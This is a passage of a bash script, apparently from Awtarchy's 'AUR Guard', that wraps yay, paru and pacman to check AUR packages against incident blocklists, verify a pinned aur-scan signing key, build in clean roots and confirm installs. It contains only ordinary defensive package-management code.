  printf 'AUR Guard: removing foreign/AUR package(s) with pacman -Rns:\n'
  printf '  %s\n' "${packages[@]}"
  printf '\n'

  sudo pacman -Rns -- "${packages[@]}"
}

auruninstall() {
  aurremove "$@"
}

sysupdate() {
  sudo pacman -Syu
}

aurcheck() {
  local helper output pkg
  local hard_blocked=false

  helper=$(_aur_guard_pick_helper) || {
    _aur_guard_fail 'no yay or paru found'
    return 127
  }
  _aur_guard_refresh_blacklists || return 1
  _AUR_GUARD_HISTORICAL_MATCHES=()

  local helper_work
  helper_work=$(mktemp -d) || return 1
  output=$(
    _aur_guard_sandbox_exec "$helper_work" allow writable / \
      "$helper" -Qua
  )
  local helper_status=$?
  rm -rf "$helper_work"
  (( helper_status == 0 )) || return "$helper_status"
  if [[ -z "$output" ]]; then
    printf 'No AUR updates available.\n'
    return 0
  fi

  printf '%s\n' "$output"
  printf '\nAUR Guard incident check:\n'

  while IFS= read -r pkg; do
    [[ -n "$pkg" ]] || continue

    if ! _aur_guard_check_emergency_block "$pkg"; then
      hard_blocked=true
      continue
    fi

    _aur_guard_note_historical_match "$pkg"
  done < <(awk '{print $1}' <<< "$output" | LC_ALL=C sort -u)

  if $hard_blocked; then
    _aur_guard_fail 'one or more available updates match the Awtarchy emergency blocklist'
    _AUR_GUARD_HISTORICAL_MATCHES=()
    return 1
  fi

  if _aur_guard_has_historical_matches; then
    _aur_guard_print_historical_summary
    _aur_guard_pass 'no emergency-blocked updates found; historical matches require full aurinstall verification and confirmation'
  else
    _aur_guard_pass 'no available AUR update names matched the emergency or historical incident lists'
  fi

  _AUR_GUARD_HISTORICAL_MATCHES=()
}

_aur_guard_ensure_aur_scan_signing_key() {
  local fingerprint="$_AUR_GUARD_AUR_SCAN_SIGNING_KEY"
  local keyserver="$_AUR_GUARD_AUR_SCAN_KEYSERV"
  local imported_fingerprint

  if command gpg --batch --list-keys "$fingerprint" >/dev/null 2>&1; then
    imported_fingerprint=$(
      command gpg --batch --with-colons --fingerprint "$fingerprint" 2>/dev/null |
        awk -F: '$1 == "fpr" { print $10; exit }'
    )
    if [[ "$imported_fingerprint" == "$fingerprint" ]]; then
      return 0
    fi
    _aur_guard_fail "existing aur-scanner signing key did not match the pinned fingerprint"
    return 1
  fi

  printf 'AUR Guard: importing pinned aur-scanner signing key %s.\n' "$fingerprint"
  if ! command gpg --batch --keyserver "$keyserver" --recv-keys "$fingerprint"; then
    _aur_guard_fail "could not fetch pinned aur-scanner signing key $fingerprint"
    return 1
  fi

  imported_fingerprint=$(
    command gpg --batch --with-colons --fingerprint "$fingerprint" 2>/dev/null |
      awk -F: '$1 == "fpr" { print $10; exit }'
  )
  if [[ "$imported_fingerprint" != "$fingerprint" ]]; then
    _aur_guard_fail "imported aur-scanner signing key fingerprint did not match the pinned value"
    return 1
  fi

  printf 'AUR Guard: verified aur-scanner signing key fingerprint %s.\n' "$fingerprint"
}

_aur_guard_ensure_aur_scan() {
  local requested_pkg="$1"
  local status

  type -P aur-scan >/dev/null 2>&1 && return 0

  if [[ ${_AUR_GUARD_AUR_SCAN_BOOTSTRAP:-0} == 1 ]]; then
    return 0
  fi

  _aur_guard_ensure_aur_scan_signing_key || return 1

  if [[ "$requested_pkg" == "$_AUR_GUARD_AUR_SCAN_PACKAGE" ]]; then
    printf 'AUR Guard: bootstrapping %s with the built-in verification stack; aur-scan becomes mandatory after installation.\n' \
      "$requested_pkg"
    _AUR_GUARD_AUR_SCAN_BOOTSTRAP=1
    return 0
  fi

  printf 'AUR Guard: aur-scan is not installed; bootstrapping stable %s through AUR Guard first.\n' \
    "$_AUR_GUARD_AUR_SCAN_PACKAGE"
  _AUR_GUARD_AUR_SCAN_BOOTSTRAP=1
  if aurinstall "$_AUR_GUARD_AUR_SCAN_PACKAGE"; then
    status=0
  else
    status=$?
  fi
  _AUR_GUARD_AUR_SCAN_BOOTSTRAP=0

  if (( status != 0 )); then
    _aur_guard_fail "could not bootstrap $_AUR_GUARD_AUR_SCAN_PACKAGE"
    return "$status"
  fi

  type -P aur-scan >/dev/null 2>&1 || {
    _aur_guard_fail "$_AUR_GUARD_AUR_SCAN_PACKAGE installed without providing aur-scan"
    return 127
  }

  printf 'AUR Guard: aur-scan is installed and will gate this AUR transaction.\n'
}

aurverify() {
  local pkg status
  local _AUR_GUARD_MODE='practical'
  local _AUR_GUARD_BUILD_REQUESTED=0
  local _AUR_GUARD_AUR_SCAN_BOOTSTRAP="${_AUR_GUARD_AUR_SCAN_BOOTSTRAP:-0}"

  case "$#" in
    1)
      pkg="$1"
      ;;
    2)
      if [[ "$1" != '--deep' ]]; then
        printf 'Usage: aurverify [--deep] package_name\n' >&2
        return 1
      fi
      _AUR_GUARD_MODE='deep'
      pkg="$2"
      ;;
    *)
      printf 'Usage: aurverify [--deep] package_name\n' >&2
      printf 'Example: aurverify awtwall\n' >&2
      printf 'Deep:    aurverify --deep awtwall\n' >&2
      return 1
      ;;
  esac

  _aur_guard_validate_package_name "$pkg" || return 1

  if command pacman -Si "$pkg" >/dev/null 2>&1; then
    local repo_name
    repo_name=$(command pacman -Si "$pkg" 2>/dev/null | awk -F': ' '/^Repository/ {print $2; exit}')

    if ! _aur_guard_check_emergency_block "$pkg"; then
      _aur_guard_fail "$pkg is available from [$repo_name] but is explicitly emergency-blocked by Awtarchy"
      return 1
    fi

    printf 'AUR Verify: %s is available from enabled pacman repo [%s].\n' "$pkg" "$repo_name"
    printf 'Historical AUR incident lists do not apply to this repository package.\n'
    _aur_guard_pass "$pkg is handled by pacman. Nothing was installed."
    return 0
  fi

  if ! _aur_guard_ensure_aur_scan "$pkg"; then
    _aur_guard_fail "could not prepare the required aur-scan security gate for $pkg"
    return 1
  fi

  _aur_guard_verify_tree "$pkg"
  status=$?

  if (( status == 0 )); then
    if _aur_guard_has_guarded_matches; then
      _aur_guard_print_historical_summary
      _aur_guard_print_context_summary
      _aur_guard_pass "$pkg and all required AUR dependencies passed ${_AUR_GUARD_MODE} verification. Review warnings remain. The requested package was not installed."
    else
      _aur_guard_pass "$pkg and all required AUR dependencies passed ${_AUR_GUARD_MODE} verification. The requested package was not installed."
    fi
  fi

  _aur_guard_cleanup_work
  return "$status"
}

aurinstall() {
  local pkg status recheck_status identity_status review_status
  local restart_count=0
  local _AUR_GUARD_MODE='practical'
  local _AUR_GUARD_BUILD_REQUESTED=1
  local _AUR_GUARD_AUR_SCAN_BOOTSTRAP="${_AUR_GUARD_AUR_SCAN_BOOTSTRAP:-0}"

  case "$#" in
    1)
      pkg="$1"
      ;;
    2)
      if [[ "$1" != '--deep' ]]; then
        printf 'Usage: aurinstall [--deep] package_name\n' >&2
        return 1
      fi
      _AUR_GUARD_MODE='deep'
      pkg="$2"
      ;;
    *)
      printf 'Usage: aurinstall [--deep] package_name\n' >&2
      printf 'Example: aurinstall awtwall\n' >&2
      printf 'Deep:    aurinstall --deep awtwall\n' >&2
      return 1
      ;;
  esac

  _aur_guard_validate_package_name "$pkg" || return 1

  if command pacman -Si "$pkg" >/dev/null 2>&1; then
    local repo_name
    repo_name=$(command pacman -Si "$pkg" 2>/dev/null | awk -F': ' '/^Repository/ {print $2; exit}')

    if ! _aur_guard_check_emergency_block "$pkg"; then
      _aur_guard_refuse_install "$pkg" "the package is explicitly emergency-blocked by Awtarchy, even though [$repo_name] currently provides it"
      return 1
    fi

    printf 'AUR Guard: %s is available from enabled pacman repo [%s].\n' "$pkg" "$repo_name"
    printf 'Historical AUR incident lists do not apply to this repository package.\n'

    if _aur_guard_is_installer_mode; then
      printf 'Awtarchy installer mode: installing with pacman --needed --noconfirm.\n'
      sudo pacman -S --needed --noconfirm "$pkg"
    else
      printf 'Installing with pacman:\n  sudo pacman -S %s\n\n' "$pkg"
      sudo pacman -S "$pkg"
    fi
    return $?
  fi

  if ! _aur_guard_check_emergency_block "$pkg"; then
    _aur_guard_refuse_install "$pkg" 'the package is present on the Awtarchy emergency blocklist'
    return 1
  fi

  if ! _aur_guard_ensure_aur_scan "$pkg"; then
    _aur_guard_refuse_install "$pkg" 'could not prepare the required aur-scan security gate'
    return 1
  fi

  while true; do
    _aur_guard_verify_tree "$pkg"
    status=$?

    if (( status != 0 )); then
      _aur_guard_refuse_install "$pkg" "recursive ${_AUR_GUARD_MODE} AUR verification failed"
      _aur_guard_cleanup_work
      return "$status"
    fi

    if _aur_guard_recheck_commits 'before building'; then
      :
    else
      recheck_status=$?
      if (( recheck_status == 3 && restart_count == 0 )); then
        printf 'AUR Guard: discarding verified work and restarting once from the new AUR commit.\n' >&2
        _aur_guard_cleanup_work
        ((restart_count++)) || true
        continue
      fi
      if (( recheck_status == 3 )); then
        _aur_guard_refuse_install "$pkg" 'an AUR package changed repeatedly during verification'
      else
        _aur_guard_refuse_install "$pkg" 'the current AUR commit could not be confirmed'
      fi
      _aur_guard_cleanup_work
      return 1
    fi

    if _aur_guard_assess_aur_identity; then
      identity_status=0
    else
      identity_status=$?
    fi

    if (( identity_status == 10 )) && [[ "$_AUR_GUARD_MODE" != deep ]]; then
      printf '\n\033[1;31mAUR Guard detected a maintainer change for an installed package.\033[0m\n' >&2
      printf 'Discarding practical-mode work and restarting automatically in deep mode.\n' >&2
      _aur_guard_cleanup_work
      _AUR_GUARD_MODE='deep'
      continue
    fi

    if (( identity_status != 0 && identity_status != 10 )); then
      _aur_guard_refuse_install "$pkg" 'AUR maintainer identity metadata could not be validated'
      _aur_guard_cleanup_work
      return 1
    fi

    if _aur_guard_review_installed_pkgbuilds; then
      :
    else
      review_status=$?
      if (( review_status == 20 )); then
        _aur_guard_refuse_install "$pkg" 'the build was cancelled after PKGBUILD review'
      else
        _aur_guard_refuse_install "$pkg" 'the installed-package review could not be completed'
      fi
      _aur_guard_cleanup_work
      return 1
    fi

    if ! _aur_guard_confirm_identity_changes; then
      _aur_guard_refuse_install "$pkg" 'the maintainer-change confirmation was not accepted'
      _aur_guard_cleanup_work
      return 1
    fi

    if ! _aur_guard_build_verified_artifacts "$pkg"; then
      _aur_guard_refuse_install "$pkg" "${_AUR_GUARD_MODE} clean-root build or artifact inspection failed"
      _aur_guard_cleanup_work
      return 1
    fi

    if _aur_guard_recheck_commits 'after building'; then
      :
    else
      recheck_status=$?
      if (( recheck_status == 3 && restart_count == 0 )); then
        printf 'AUR Guard: discarding built artifacts and restarting once from the new AUR commit.\n' >&2
        _aur_guard_cleanup_work
        ((restart_count++)) || true
        continue
      fi
      if (( recheck_status == 3 )); then
        _aur_guard_refuse_install "$pkg" 'an AUR package changed repeatedly while artifacts were being built'
      else
        _aur_guard_refuse_install "$pkg" 'the current AUR commit could not be confirmed after building'
      fi
      _aur_guard_cleanup_work
      return 1
    fi

    if ! _aur_guard_confirm_guarded_install "$pkg"; then
      _aur_guard_refuse_install "$pkg" 'installation was not confirmed after warning review'
      _aur_guard_cleanup_work
      return 1
    fi

    if ! _aur_guard_install_verified_transaction "$pkg"; then
      _aur_guard_refuse_install "$pkg" 'the final verified pacman transaction failed'
      _aur_guard_cleanup_work
      return 1
    fi

    if ! _aur_guard_store_pkgbuild_snapshots; then
      printf '%s\n' 'AUR Guard: installation succeeded, but one or more PKGBUILD review snapshots could not be saved.' >&2
    fi

    _aur_guard_pass "$pkg and every required AUR dependency were built in disposable clean roots and installed from reverified local artifacts using ${_AUR_GUARD_MODE} mode."
    _aur_guard_cleanup_work
    return 0
  done
}

# Backward-compatible AUR Guard install command.
aurup() {
  aurinstall "$@"
}

aur() {
  if (( $# != 0 )); then
    printf 'Usage: aur\n' >&2
    return 1
  fi

  aurhelp
}

aurguard() {
  aur "$@"
}

aurunsafe() {
  local helper="${1:-}"
  local answer

  shift || true

  case "$helper" in
    yay|paru)
      ;;
    *)
      printf 'Usage: aurunsafe yay|paru [args...]\n' >&2
      printf 'Example: aurunsafe yay -Syu\n' >&2
      return 1
      ;;
  esac

  if ! type -P "$helper" >/dev/null 2>&1; then
    printf '%s is not installed or not in PATH.\n' "$helper" >&2
    return 127
  fi

  printf '\033[1;31mUnsafe AUR override requested.\033[0m\n'
  printf 'This bypasses Awtarchy AUR Guard and runs raw %s.\n' "$helper"
  printf 'Type exactly YES to continue: '
  read -r answer

  if [[ "$answer" != 'YES' ]]; then
    printf 'Cancelled.\n'
    return 1
  fi

  command "$helper" "$@"
}

yay() {
  _aur_guard_run_helper yay "$@"
}

paru() {
  _aur_guard_run_helper paru "$@"
}
